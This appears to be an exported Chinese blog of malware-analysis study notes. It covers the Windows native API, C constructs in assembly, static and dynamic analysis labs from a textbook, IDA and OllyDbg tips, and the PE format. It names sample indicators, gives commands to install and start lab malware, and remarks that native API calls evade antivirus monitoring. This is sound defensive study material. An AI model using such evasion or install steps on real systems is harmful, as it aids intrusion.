内核与用户模式Windows使用两种处理器特权级别:内核模式与用户模式。依据处理器上执行的代码的类型，处理器在两个模式之间切换。应用程序在用户模式下执行。核心操作系统组件在内核模式下执行。多个驱动程序在内核模式下执行，但某些驱动程序在用户模式下执行。用户模式：不能直接访问硬件，应用程序的虚拟地址空间除了为专用空间以外。还会受到限制。在用户模式下执行的处理器无法訪问为该操作系统保留的虚拟地址。限制用户模式应用程序的虚拟地址空间可防止应用程序更改而且可能损坏关键的操作系统数据。内核模式: 内核模式下执行的全部代码都共享单个虚拟地址空间。这表示内核模式驱动程序未从其它驱动程序和操作系统自身独立开来。 原生态API原生态API是用来和Windows进行交互的底层API,他们很少被非恶意软件使用，但是在恶意代码作者之间却很受欢迎。调用原生API函数可以绕过普通Windows API。当调用Windows API中的一个函数时，这个函数通常不会直接执行请求的动作，因为大多数重要的数据结构都会被保存在内核中。这时用户程序被给予对用户API(如:DLL)的访问，这些DLL会调用ntdll.dll，这是一个特殊的DLL程序，它管理用户空间与内核的 交互。然后处理器却换到内核模式，并执行内核中的一个函数。这里ntdll函数像内核中的函数一样，使用API和结构体，这些函数组成了原生API。应用程序不建议调用原生API,但是操作系统中没有任何东西来阻止它们这样做。所有直接调用原生API对恶意代码作者来说很有吸引力，因为原生态API允许它们做一些采用别的方式不可能做到的事情，同时有时候很隐蔽(比如:一些反病毒软件是监控一个进程使用的系统调用，这里就可以躲避啦)。 lab这个程序如何完成持久化驻留，来确保在计算机被重启后它能继续运行发现两个函数:其中一个是StartServiceCtrlDispatcherA——&gt;在2000/XP等基于NT 的操作系统中，有一个服务管理器，它管理的后台进程被称为 service。在任务管理器中，并且随系统启动而最先运行，随系统关闭而最后停止。 为什么程序会使用一个互斥量用于控制共享资源的访问 可以用来检测这个程序的基于主机特征是什么？使用Malservice与HGL345的互斥量，发现恶意域名:http://www.malwareanalysisbook.com 检测这个恶意代码基于网络特征是什么？发现恶意域名:http://www.malwareanalysisbook.com。并且调用InternetOpenUrlA网络函数 这个程序的目的是什么开机自启动，并且访问域名http://www.malwareanalysisbook，同时有WriteFile函数，可以写文件 这个程序什么时候完成执行关机即结束]]></content>
      <categories>
        <category>re</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[恶意代码分析———识别汇编中的C代码结构]]></title>
    <url>%2F2018%2F03%2F31%2Fre_evil_2%2F</url>
    <content type="text"><![CDATA[C语言是最基础的高级编程语言，许多恶意代码都是有C编写的 识别汇编中的C代码结构全局与局部变量全局变量可以被一个程序中的任意函数访问和使用，局部变量只能在它被定义的函数中访问和使用.例如:1234567#include&lt;stdio.h&gt;int x=1, y=3;void main()&#123; x = x + y; printf(&quot;Total = %d\n&quot;,x);&#125; 与1234567#include&lt;stdio.h&gt;void main()&#123; int x = 1, y = 3; x = x + y; printf(&quot;Total = %d\n&quot;,x);&#125; 汇编结构:全局变量通过内存地址引用，而局部变量通过栈地址引用. 各种结构体if-else123456789101112131415161718192021#include&lt;stdio.h&gt;void main()&#123; int x = 1, y = 3,x1=0,y1=2; if (x==y) &#123; if(y1==x1)&#123; printf("y == x\n and y1==x1\n"); &#125; else &#123; printf("y == x and y1!=x1\n"); &#125; &#125; else &#123; if (y1==x1) &#123; printf("y1== x1 and x!=y\n"); &#125; else &#123; printf("y1!= x1 and x!=y\n"); &#125; &#125;&#125; 汇编窗口视图逻辑是一样的，判断后跳转 switch123456789101112131415161718#include&lt;stdio.h&gt;void main()&#123; int i=0; switch (i) &#123; case 1: printf("i == 1"); break; case 2: printf("i == 2"); break; case 3: printf("i == 3"); break; &#125;&#125; 汇编窗口视图 for12345678910#include&lt;stdio.h&gt;void main()&#123; int i; for ( i = 0; i &lt; 10; i++) &#123; printf("i equals %d\n",i); &#125;&#125; 汇编窗口 while12345678910#include&lt;stdio.h&gt;void main()&#123; int i=0; while(i&gt;10)&#123; printf("i equals %d\n",i); i++; &#125;&#125; 汇编窗口 数组12345678910111213#include&lt;stdio.h&gt;int b[5] = &#123;5,6,7,8,9&#125;;void main()&#123; int i=0; int a[5]; for (i = 0; i &lt; 5; i++) &#123; a[i] = i; b[i] = i; &#125;&#125; 汇编窗口视图 结构体12345678910111213141516171819202122#include&lt;stdio.h&gt;struct my_struct &#123; int x[5]; char y; double z;&#125;;struct my_struct *gms;void test(struct my_struct *q)&#123; int i; q-&gt;y = 'a'; q-&gt;z = 15.6; for (i = 0; i &lt; 5; i++) &#123; q-&gt;x[i] = i; &#125;&#125;void main()&#123; gms = (struct my_struct *)malloc(sizeof(struct my_struct)); test(gms);&#125; 汇编窗口 遍历列表12345678910111213141516171819202122232425#include&lt;stdio.h&gt;struct node &#123; int x; struct node *next;&#125;;typedef struct node pnode;void main()&#123; pnode *curr, *head; int i; head = NULL; for (i = 0; i &lt;= 10;i++) &#123; curr = (pnode *)malloc(sizeof(pnode)); curr-&gt;x = i; curr-&gt;next = head; head = curr; &#125; curr = head; while (curr) &#123; printf("%d\n",curr-&gt;x); curr == curr-&gt;next; &#125;&#125; 汇编窗口 函数调用约定cdeclC语言默认的函数调用方法：所有参数从右到左依次入栈，这些参数由调用者清除，称为手动清栈。 stdcall 调用约定用于调用 Win32 API 函数。其参数都是从右向左通过堆栈传递的, 被调用方将清理堆栈 fastcall规定将前两个参数由寄存器ecx和edx来传递(x86)，其余参数还是通过堆栈传递（从右到左）。函数调用结束后由被调用函数清除栈内数据 实践lab06-011、由main函数调用的唯一子过程中发现的主要代码结构是什么?有一个if-else结构体2、位于0x40105f的子过程是什么？一个结构体，输出函数3、这个程序的目的是什么？判断网络连接状态 lab06-21、main函数调用的第一个子过程执行什么操作？判断网络连接状态2、位于0x40117F的子过程是什么？一个结构体，输出函数3、被main函数调用的第二个子过程做了什么？一个连接网络的函数4、在这个子过程中使用了什么类型的代码结构？使用了if-else和结构体5、在这个子过程中使用了什么类型的代码结构？指定连接这个域名 http://www.practicalmalwareanalysis.com6、这个恶意代码的目的是什么？判断是否有网络并且连接这个域名 http://www.practicalmalwareanalysis.com]]></content>
      <categories>
        <category>re</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[恶意代码分析——静态与动态分析基础技术]]></title>
    <url>%2F2018%2F03%2F29%2Fre_evil_1%2F</url>
    <content type="text"><![CDATA[啥？你电脑中病毒啦，被勒索啦，那就来好好学习恶意代码分析，讲得很好。留下了没有技术的眼泪 恶意代码什么是恶意代码分析恶意代码也称为恶意软件:任何以某种方式来对用户、计算机或者网络炒成破坏的软件，包括计算机病毒、木马、蠕虫、内核套件、勒索软件、间谍软件； 各种鸡汤不管你是否有恶意代码分析的背景或经验，你都会从本书中受益。若你将要被安全公司炒，那么你马上拿起这本书啃，这将会帮助你保住饭碗。若你还是对恶意软件一无所知，那么你会将开启一闪全新的大门。。鸡汤再多，还是要动手实践，实践是检测能力的唯一标准。 恶意代码类型1、后门: 恶意代码将自身安装到一台计算机来 允许攻击者来访问。后门程序通常让攻击者只需很少认证甚至无需认证，便可连接到 远程计算机上，并可以在本地系统执行命令。2、僵尸网络：与后门类似，也允许攻击者访问系统。但是所有被同一个僵尸网络感染的计算机将会从一台控制命令服务器收到相同的命令3、下载器:这是一类只是用来下载其他恶意代码的恶意代码。下载器通常是在攻击者获得系统的访问时，首先进行安装的。下载程序会下载和安装其他的恶意代码。4、间谍软件:这是一类从受害计算机上收集信息并发送给攻击者的恶意代码。比如:键盘记录器5、启动器: 用来启动其他恶意程序的恶意软件。一般使用一些非传统的技术，以确保其隐蔽性，或者以获取高权限访问系统。6、内核套件: 设计用来隐藏其他恶意代码的恶意软件。通常与其他恶意代码(后门)组合成工具套装。7、勒索软件:通过骚扰、恐吓甚至采用绑架用户文件等方式，使用户数据资产或计算资源无法正常使用，并以此为条件向用户勒索钱财。这类用户数据资产包括文档、邮件、数据库、源代码、图片、压缩文件等多种文件。赎金形式包括真实货币、比特币或其它虚拟货币。8、发送垃圾邮件的恶意代码:这类恶意代码在感染用户计算机之后，便会使用系统与网络资源来发送大量的垃圾邮件。9、蠕虫或计算机病毒:可以自我复制和感染其他计算机的恶意代码。 静态分析基础技术知识技能依赖要能够对恶意代码进行分析，需要掌握大量的知识，以及较强的代码逆向分析能力，代码调试能力。 要分析恶意软件执行了哪些行为，首先需要知道恶意软件常见的一些行为，如反弹shell，进程感染，文件隐藏，信息收集等。而要弄清这些行为，恶意软件需要对文件，注册表，进程进行操作，同时恶意软件要对感染的主机下发指令，传输收集到的信息，通常需要建立网络连接。要更准确的分析需要知道使用了哪些WinAPI实现了这些功能。对于初级的分析方法，只要掌握常见的知识，以及一些工具的使用即可快速的掌握。如可以使用工具分析文件的hash值，字符串，函数表，函数库依赖关系。 另外可以运行恶意代码用工具监控恶意软件对文件，注册表，网络，进程的访问与操作。 要深入到代码层级去分析恶意代码，需要代码逆向分析的能力，需要读的懂汇编代码，熟练使用IDA进行分析，熟练使用ollydbg等调试工具。 反病毒引擎扫描:实用的第一步当分析一个可疑的代码样本时，第一步就最好是拿多个反病毒软件扫描下这个文件，看是否有哪个引擎已经能够识别它。因为反病毒软件主要依靠一个已知的恶意代码可识别片段的特征数据库(病毒文件特征库)，以及基于行为与模式匹配的分析(启发式检测)。而攻击者可以轻易的修改自己的代码。这时，对同一个可疑恶意代码样本，运行多个不同的反病毒软件进行扫描检测 是相当有必要的，类似VirusTotal(http://www.virustotal.com/)在没有恶意代码分析所需要的一些知识和技能的情况下，使用现成的杀毒工具无疑是最好的方法。即使有这个能力，如果恶意软件样本的泄露不会造成重要资产的泄露，使用现成的工具进行扫描也能够提供很多有用的信息，减少大量的人工投入。 其中最为常用的就是PC端的杀毒软件，如360，腾讯安全管家等。但是不管是哪款杀毒软件都存在一定的误报和漏报。使用在线等多引擎杀毒软件能够较好的反应是否为恶意软件http://www.virscan.org/在上面的网站上，分析包括了基本信息，关键行为，进程行为，文件行为，网络行为，注册表行为，其他行为这些恶意软件常见的操作目标。静态文件分析方法如下图所示（数字代表优先级，星星表示收集了对应的工具） 哈希值:恶意代码的指纹哈希是一种用来唯一标识恶意代码的常用方法。恶意代码样本通过一个哈希程序，会产生出一段用于唯一标识这个样本的独特哈希值(类似一种指纹)MD5算法是恶意代码分析最为常用的一种哈希函数，SHA算法也同样流行。如:使用md5deep程序来计算Windows操作系统自带的Solitaire程序哈希值,然后在线查找搜索这段哈希值，看看这个文件是否被识别：图形化界面WinMD5计算器，可以同时计算和显示出多个文件的哈希值。一旦你对一个恶意样本拥有一个哈希值之后，你可以把它做如下用途:将哈希值作为标签使用与其他分析师分享哈希值，以帮助他们来识别恶意代码在线搜索这段 哈希值，看看这个文件是否被识 查找字符串一个程序会包含一些字符串，比如打印出的消息，连接的URL,或者复制文到某个特定的位置。从字符串中进行搜索是获取程序功能提示的一种简单方法 。比如程序访问一个URL，访问的URL就是存储为程序中的一个字符串。可以使用String程序(http://technet.microsoft.com/enus/sysinternals/bb897439)来搜索可执行文件中可打印的字符串。而一般在可执行文件中是以ACSII码和Unicode(这里指的是微软的)存储的，如下查找结果 加壳与混淆恶意代码恶意代码编写者经常使用加壳或混淆技术，让程序更难被检测或分析。混淆程序是恶意代码编写者尝试去隐藏其执行过程的代码。而加壳程序则是混淆程序的一类，加壳后的恶意程序一般会被压缩，并且难以分析。合法程序大多总是会包含很多字符串，而由被加壳或混淆的恶意代码直接分析获得的字符串很少(一般包含LoadLibrary和GetProcAddress函数，他们是用来加载和使用其他函数功能的)。 文件加壳当加壳文件的程序运行时，会先进行一小段的脱壳代码，来解压缩加壳的文件，然后在运行脱壳后的文件，如下图。当对一个加壳程序进行静态分析时，只有这一小段代码可以被解析。 使用PEID(或exeinfoPE)检测加壳PE的文件结构我前面有写https://esebanana.github.io/2018/03/21/re_PE/ 链接库与函数对于一个可执行文件，我们可以收集到最有用的信息之一，就是它的导入表。导入表函数是一个程序所使用的函数，但存储在其他程序中的那些函数。链接分为:静态链接，运行时链接与动态链接 静态链接，运行时链接与动态链接静态链接是Windows平台链接代码库最不常用的方法，当一个库被静态链接到可执行文件时，所有这个库中的代码都会被复制到可执行文件中。这会让执行程序大很多。 运行时链接在合法程序中并不流行，但是在恶意代码中是常用的，特别是当恶意代码被加壳或是混淆的时候。使用运行时链接的可执行程序，只有当需要使用函数时，才链接到库，而不是想动态链接模式那样在程序启动时就会链接。 动态链接是windows里最常用的，将一些函数打包在一个dll里，然后通过程序调用dll里的函数，在程序启动时就会链接上。 使用Dependency Walker工具探索动态链接函数界面常见的dll 静态分析技术实践学习样本:(http://www.practicalmalwareanalysis.com)或(http://www.nostarch.com/malware.htm) 反病毒引擎扫描将Lab01-01.exe和Lab01-01.dll放到https://www.virustotal.com结果如下(我是翻墙的)： 什么时候编译的 是否被混淆或者加壳发现并没有加壳，但是用Dependency Walker查看发现并没有很多函数，可能被混淆啦。接着用strings 查看dll,发现一个ip地址 是否导入函数，是做什么的发现有两个重要的结果1.点用到内核函数库Kernel32.dll函数库中的几个重要的函数，CreateProcessA，Sleep.2.调用MSVCRT.dll多线程库，调用网络链接库，外加上一个IP地址，猜测用到http服务 是否有任何其它文件或基于主机的迹象用PEview打开首先是两个近似函数Kernel32.dll 与Kerne132.dll，初步判断是进行文件混淆目的。然后是一个系统目录路径，一个函数Kerne132.dll，初步判断是这个路径和Kerne132.dll存在某种关联。然后再来两个Kernel32.dll 和Lab01-01.dll，Lab01-01.dll这很明显就是上面分析的.dll文件，所以初步判定是这个程序需要调用到Kernel32.dll 和Lab01-01.dll。然后是系统路径和Kernel32.dll文件，和一个函数。这就是说调用到系统路径里的Kernel32.dll文件的某个函数众多联系起来可以进一步判断，这个程序实现的功能是在系统路径中寻找，创建，复制一个Kerne132.dll文件，然后还调用了Lab01-01.dll文件实现它里面的功能。 是否有基于网络的迹象有基于网络的迹象，发现IP：127.26.152.13 文件的目的是什么该文件并没有加壳，她住要实现的功能是，调用Kernel32.dll文件的相关函数，实现在系统目录里面遍历查找是否存在Kerne132.dll文件，如果不存在就进行创建Kerne132.dll文件，进行混淆Kernel32.dll文件，然后再调用Lab01-01.dll文件，实现通过联通网络，然后接受目标IP：127.26.152.13传过来的指令，通过该文件后门向系统发出休眠指令使得系统进入休眠状态。 动态分析动态分析就是在运行恶意代码之后进行检查的过程。动态分析技术是恶意代码分析流程的第二步，一般在静态分析基础技术进入一个困难的时候。，动态分析能让你观察到恶意代码的真实功能，一个行为存在二进制程序中，并不意味着他就会执行，动态分析也是一种识别恶意代码功能的有效方法。虽然动态分析技术分成好用，但它还是应该在静态分析基础技术之后进行。 沙箱简便但粗糙的方法有几个功能一体化的软件产品，可以用来进行基本的动态分析，最流行的就是沙箱技术，沙箱是一种在安全环境里运行不信任程序的安全机制，不用担心伤害到”真正的”系统。沙箱包含一个虚拟环境，通过某种方式模拟网络服务，以确保被测试的软件或恶意代码能正常执行。 使用恶意代码沙箱许多分析容易的代码的沙箱，诸如1Norman沙箱，GFI沙箱，Anubis,Joe沙箱、ThreatExpert\BitBlaze和Comodo 恶意代码分析，等等，都是提供免费分析恶意代码服务。Norman沙箱，GFI沙箱是最受欢迎的。这些沙箱都提供容易理解的输出结果，而且用来做初诊断非常有用，而且这些沙箱都是自动执行的。 rundll32.exe所有windows版本中都包含rundll32.exe程序，它提供了一个运行DLL的平台语法：C:\rundll32.exe DLLname,Export arguments Process Monitor进程监视器，它提供一种方式来监控注册表，文件系统，网络，进程和线程行为，结合并增强了FileMon和RegMon的功能 Process Explorer进程浏览器，用来列出所有活跃的进程，被进程载入的DLL，各种进程属性和整体系统信息，也可以用它杀死一个进程，退出用户登录，启动与激活进程 Dependency Walker支持列出可执行文件的动态链接 Regshot注册表比较工具，可以比较两个注册表的快照，发现差异 ApateDNS用来查看恶意代码发出的DNS请求 Netcat被用在支持端口扫描，隧道，代理，端口转发等对内外连接上 Wireshark嗅探器，截获并记录网络数据包的工具 INetSim基于linux模拟常见网络服务的免费软件，通过模拟服务（HTTP，HTTPS，FTP，IRC，DNS，SMTP等），允许你来分析未知恶意代码的网络行为 动态分析技术实践lab3-1找出这个恶意代码的导入函数与字符串列表用Dependecy Walker和Peid查看,发现导入函数很少，接着发现加壳用strings工具查看，发现一个网站和admin，注册表 这个恶意代码在主机上的感染迹象特征是什么先将虚拟机拍快照，然后准备运行，win7上发现运行不了然后找个xp pro x86的运行可以看出程序一共修改了17处的注册表，其中，增加了2个键，3个值，改变了12个指，新建的键是上面这2个，新建了两个打印的键，新添加的值是上面这3个，一个是开机启动的值，为C:\WINDOWS\system32\vmx32to64.ex。 是否存在一些有用的网络特征码？网络特征码就是那个恶意域名的解析过程和https的连接 lab3-1你怎样才能让这个恶意代码自行安装有PEview查看dll的导入表用Dependency Walker查看依赖，会发现一些创建线程函数，注册表，网络服务。用strings来看看，发现一个域名practicalmalwareanalysis.com，serve.html，getfile，cmd.exe /c,还有一些注册表操作的语句这是运行:rundll32.exe Lab03-02.dll,install 在安装之后，你如何让这个恶意代码运行起来？用windows启动服务的方式来启动net start IPRIP 你怎么能找到这个恶意代码是在哪个进程下运行的？用Process Explorer，Find菜单-&gt; Find Handle or DLL…寻找我们那个DLL文件 你可以在procmon工具中设置什么样的过滤器，才能收集这个恶意代码的信息？用发现的PID就行过滤， 这个恶意代码在主机上的感染迹象是什么？感染迹象就是会有创建一个服务叫IPRIP 这个恶意代码是否存在一些有用的网路特征码？我们先去看看DNSChef和INetSim服务器上的 记录，先检查一下dns的解析记录，用DNSChef虚拟机看，和我们前面发现的恶意域名是对应的，记录在log/service.log里面，这个DLL从我们的fake服务器下载一个serve.html，而我们伟大的INetSim返回了sample.html作为serve.html，其实这里就不需要用netcat来监听本地80端口了所以这个网络特征就是那个漫长的恶意域名的解析，和对恶意域名请求一个serve.html 来源这里可以下载到所有的工具:https://github.com/vito-L/malware-analysis/blob/master/Tools.md恶意代码分析实战]]></content>
      <categories>
        <category>re</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[RE_IDA_OD的常用小技巧]]></title>
    <url>%2F2018%2F03%2F26%2Fre_ida%2F</url>
    <content type="text"><![CDATA[IDA和OD是逆向中必不可少的一部分，现在来分享一下IDA和OD的一些技巧 IDA1、查找字符串(Shift+f9)View-&gt;open subviews-&gt;Strings 2、修改文件，打补丁(patch)1、找到修改地方2、修改文件，也可以在(Hex view)窗口修改16进制:双击要修改的地方 -&gt;使用F2捷方式修改当前字节 -&gt;再按下F2快捷方式应用修改。3、保存文件修改后的文件:[IDA Main Menu]-&gt;[Edit]-&gt;[PatchProgram]-&gt;[Apply patches to input file…]IDA图形视图会有执行流，Yes箭头默认为绿色，No箭头默认为红色，蓝色表示默认下一个执行块。 3、ida无法识别，红色代码，不能f5如果地址是红色，当f5时会出现这句话：The function has undefined instruction/data at the specified address.那就创建一个函数(P)，当创建函数时，会出现这句话：The function has undefined instruction/data at the specified address.Your request has been put in the autoanalysis queue如果我们不能创建函数,就不能使用F5来分析代码了,想让这些代码变绿色的方法(创建函数)很简单.用鼠标从函数头部开始到 retn 结尾 拖一下,变成灰色.然后用快捷键 P 或者右键菜单,CreateFunction 来创建函数就可以了。当然了,到这里也不算完.下图是代码变绿色的,我用上面的方法创建函数了,可还是不能F5,我们通过Stack Pointer (option-&gt;General-&gt;Disassembly选中stack pointer)发现这个函数的堆栈是不平衡的.此时我们需要找接近retn 的 最后一个Call 然后去修正堆栈.此时我们需要找接近retn 的 最后一个Call 然后去修正堆栈.我们看到 retn 左边绿色的数字是 28,我们通过ALT + k 修正堆栈,把 28 retn 改成 0 就可以了。修正堆栈的时候一定要选择 Call 然后修正堆栈,下图是修正后的 代码 4、常用快捷键1、快捷键F5显示C伪代码2、(Shift+f9)查找字符串3、快捷键Alt+T，打开文本搜索对话框，在String文本框中输入要搜索的字符串点击OK即可4、翻页 esc 和 Ctrl+Enter5、使用小键盘“-”，“+”查看函数之间的关系6、G跳转地址7、使用快捷键”*”把变量重定义为数组8、对于数字，16进制和10进制转换(H),转化成10字符(R) OD(olldbg)1、常用快捷键0、f2下断点1、f7进入call2、f8不进入call3、f9运行4、f4运行到当前位置5、’-‘回到上一步的位置6、’*’回到当前运行的位置7、Ctrl+F2 重新运行程序到起始处，用于重新调试程序8、Ctrl+G 寻找十六进制地址9、Alt+F2 关闭被调试程序。10、f3 选择可执行文件11、ctrl+b 在地址栏进行查找字符串12、m -&gt; 查找 OD上面图标1、’b’查看断点2、’m’打开内存3、’c’回到反汇编窗口 OD保存文件1、寻找到需要patch的地方2、修改(patch)文件3、 保存文件: 窗口中选中修改过的语句—&gt;右击—&gt;复制到可执行文件—&gt;“选择”或者“所有修改”—&gt;出现“文件”窗口—&gt;右击—&gt;保存文件]]></content>
      <categories>
        <category>re</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[RE_PE]]></title>
    <url>%2F2018%2F03%2F21%2Fre_PE%2F</url>
    <content type="text"><![CDATA[复习可执行文件的文件结构——PE。PE文件是微软Windows操作系统上的程序文件，意为可移植的可执行的文件。PE的段头直接沿用的COFF 的段头结构。 1、PE的结构DOS头: 是DOS命令窗口下可以执行，其实没有PE文件也是可以执行的（听说是老一辈习惯啦DOS命令下执行，就加上去啦）。NT头: 是PE中最大的结构体啦，其中有签名，文件头和可选头。节区头: 定义(代码，数据，资源等的大小，起始位置，权限等) 2、DOS头DOS结构体123456789101112131415161718192021typedef struct _IMAGE_DOS_HEADER &#123; // DOS .EXE header WORD e_magic; // Magic number WORD e_cblp; // Bytes on last page of file WORD e_cp; // Pages in file WORD e_crlc; // Relocations WORD e_cparhdr; // Size of header in paragraphs WORD e_minalloc; // Minimum extra paragraphs needed WORD e_maxalloc; // Maximum extra paragraphs needed WORD e_ss; // Initial (relative) SS value WORD e_sp; // Initial SP value WORD e_csum; // Checksum WORD e_ip; // Initial IP value WORD e_cs; // Initial (relative) CS value WORD e_lfarlc; // File address of relocation table WORD e_ovno; // Overlay number WORD e_res[4]; // Reserved words WORD e_oemid; // OEM identifier (for e_oeminfo) WORD e_oeminfo; // OEM information; e_oemid specific WORD e_res2[10]; // Reserved words LONG e_lfanew; // File address of new exe header &#125; IMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER; e_magic：所有PE开头都有DOS签名 “MZ”，这是以一个名叫Mark Zbikowski的DOS可执行文件的设计者首字母命名的e_lfanew:指向NT头的位置，long类型，占4个字节。例: 3、NT头NT结构体12345typedef struct _IMAGE_NT_HEADERS &#123; DWORD Signature; IMAGE_FILE_HEADER FileHeader; IMAGE_OPTIONAL_HEADER OptionalHeader; &#125; IMAGE_NT_HEADERS, *PIMAGE_NT_HEADERS; 第一个参数是: 一个PE标志。在一个有效的PE文件里，Signature字段被设置为00004550h。第二个参数是: IMAGE_FILE_HEADER结构体。第三个参数是: OptionalHeader结构体。 NT文件头123456789typedef struct _IMAGE_FILE_HEADER &#123; WORD Machine; //机器型号,哪个CPU可以跑的.重要. WORD NumberOfSections; //节的数量 .data , .text DWORD TimeDateStamp; //程序的编译时间,参考用,没有实际作用 DWORD PointerToSymbolTable; //符号表地址，主要是给比人用的 DWORD NumberOfSymbols; //符号表大小 WORD SizeOfOptionalHeader; //可选头大小,这个字段很重要.才知道可选头是多大 WORD Characteristics; //文件属性,描述文件信息的.&#125; IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER; NT可选头结构体1234567891011121314151617181920212223242526272829303132333435363738typedef struct _IMAGE_OPTIONAL_HEADER &#123; // // Standard fields. // WORD Magic; // 标志字, ROM 映像（0107h）,普通可执行文件（010Bh） BYTE MajorLinkerVersion; // 链接程序的主版本号 BYTE MinorLinkerVersion; // 链接程序的次版本号 DWORD SizeOfCode; // 所有含代码的节的总大小 DWORD SizeOfInitializedData; // 所有含已初始化数据的节的总大小 DWORD SizeOfUninitializedData; // 所有含未初始化数据的节的大小 DWORD AddressOfEntryPoint; // 程序执行入口RVA DWORD BaseOfCode; // 代码的区块的起始RVA DWORD BaseOfData; // 数据的区块的起始RVA DWORD ImageBase; // 程序的首选装载地址 DWORD SectionAlignment; // 内存中的区块的对齐大小 DWORD FileAlignment; // 文件中的区块的对齐大小 WORD MajorOperatingSystemVersion; // 要求操作系统最低版本号的主版本号 WORD MinorOperatingSystemVersion; // 要求操作系统最低版本号的副版本号 WORD MajorImageVersion; // 可运行于操作系统的主版本号 WORD MinorImageVersion; // 可运行于操作系统的次版本号 WORD MajorSubsystemVersion; // 要求最低子系统版本的主版本号 WORD MinorSubsystemVersion; // 要求最低子系统版本的次版本号 DWORD Win32VersionValue; // 莫须有字段，不被病毒利用的话一般为0 DWORD SizeOfImage; // 映像装入内存后的总尺寸 DWORD SizeOfHeaders; // 所有头+ 区块表的尺寸大小 DWORD CheckSum; // 映像的校检和 WORD Subsystem; // 可执行文件期望的子系统 WORD DllCharacteristics; // DllMain()函数何时被调用，默认为0 DWORD SizeOfStackReserve; // 初始化时的栈大小 DWORD SizeOfStackCommit; // 初始化时实际提交的栈大小 DWORD SizeOfHeapReserve; // 初始化时保留的堆大小 DWORD SizeOfHeapCommit; // 初始化时实际提交的堆大小 DWORD LoaderFlags; // 与调试有关，默认为0 DWORD NumberOfRvaAndSizes; // 下边数据目录的项数，这个字段自Windows NT 发布以来 // 一直是16 IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES]; // 数据目录表 &#125; IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32; 一共31个字段成员,6个重要的RVA也叫作OEPAddressOfEntryPoint 持有EP 的RVA 值基址SizeOfHeader PE 头的大小Subsystem 用来区分系统驱动文件与普通可执行文件。DataDirectory数组 重点是最后一个成员IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];因为DataDirectory数组里保存了导入表（用了哪些dll），导出表，TLS（Thread Local Storage） Directory等RVA和大小的信息倒数第二个变量决定NumberOfRvaAndSizes数组长度在LoadPE工具中，文件头显示信息，如下： DataDirectory数组IMAGE_DATA_DIRCTORY结构如下：1234typedef struct _IMAGE_DATA_DIRECTORY &#123; DWORD VirtualAddress; //相对虚拟地址 DWORD Size; //大小 &#125; IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY; 一个是RVA，一个是大小 data directory数据目录在WINNT.H中定义为123456789101112131415#define IMAGE_DIRECTORY_ENTRY_EXPORT 0 导出表 #define IMAGE_DIRECTORY_ENTRY_IMPORT 1 导入表 #define IMAGE_DIRECTORY_ENTRY_RESOURCE 2 资源目录 #define IMAGE_DIRECTORY_ENTRY_EXCEPTION 3 异常目录 #define IMAGE_DIRECTORY_ENTRY_SECURITY 4 安全目录 #define IMAGE_DIRECTORY_ENTRY_BASERELOC 5 重定位基本表 #define IMAGE_DIRECTORY_ENTRY_DEBUG 6 调试目录 #define IMAGE_DIRECTORY_ENTRY_COPYRIGHT 7 描术字串 #define IMAGE_DIRECTORY_ENTRY_GLOBALPTR 8 机器值 #define IMAGE_DIRECTORY_ENTRY_TLS 9 TLS目录 #define IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG 10 载入配值目录 #define IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT 11 绑定输入表 #define IMAGE_DIRECTORY_ENTRY_IAT 12 导入地址表 #define IMAGE_DIRECTORY_ENTRY_DELAY_IMPORT 13 延迟载入描述 #define IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR 14 COM信息 在LoadPE工具中，数据目录显示信息，如下： 4、RVA和RAW理解PE 最重要的一个部分就是理解文件从磁盘到内存地址的映射过程，做逆向的人员，只有熟练地掌握才能跟踪到程序的调用过程和位置，才能分析和寻找漏洞。对于文件和内存的映射关系，其实很简单，他们通过一个简单的公式计算而来：换算公式是这样的：RAW - PointToRawData(磁盘文件中节区起始位置) = RVA(相对虚拟地址) - VirtualAddress 寻找过程就是先找到RVA 所在的段，然后根据公式计算出文件偏移。因为我们通过逆向工具，可以在内存中查找到所在的RVA，进而我们就可以计算出在文件中所在的位置，这样，就可以手动进行修改。 VA与RVA公式是这样的： RVA = VA（虚拟地址） - ImageBase（基址）结果: RAW = VA - ImageBase - VirtualAddress + PointerToRawData比如:VA=0x003A20F4 , ImageBase =0x003A0000可以看到0x20F4地址位于VirtualAddress 为0x2000的.rdata节，偏移为0x20F4 - 0x2000 = 0xF4观察节表，.rdata的PointerToRawData为0xE00，字符串在磁盘中的地址为0xE00 + 0xF4 = 0xEF4使用公式：RAW = VA - ImageBase - VirtualAddress + PointerToRawData = 0x003A20F4 - 0x003A0000 - 0x2000 + 0xE00 = 0xEF4用winhex打开二进制文件 5、IAT与EATIAT一个普通PE文件的运行往往需要导入多个库文件，在PE文件运行时如何找到库文件中函数的准确入口是程序正确运行的保证。IAT就是提供这样保证的一个机制。IAT总得来说是一张表，表内存储着每个库文件函数在内存中的地址。结构体12345678910typedef struct _IMAGE_IMPORT_DESCRIPTOR &#123; union &#123; DWORD Characteristics; //导入表结束标志 DWORD OriginalFirstThunk; //RVA指向一个结构体数组(INT表) &#125;; DWORD TimeDateStamp; //时间戳 DWORD ForwarderChain; // -1 if no forwarders DWORD Name; //RVA指向dll名字，以0结尾 DWORD FirstThunk; //RVA指向一个结构体数组(IAT表)&#125; IMAGE_IMPORT_DESCRIPTOR, *PIMAGE_IMPORT_DESCRIPTOR; 第一个成员是一个联合体：一般给出的是OriginalFirstThunk的值，这个值是INT的地址，INT（Import Name Table）是一个存储了库文件函数名称的表第二个成员是时间戳第三个成员是ForwarderChain第四个成员是Name，存储的是库名称字符数组的地址第五个成员是FirstThunk，存储的是IAT表的地址 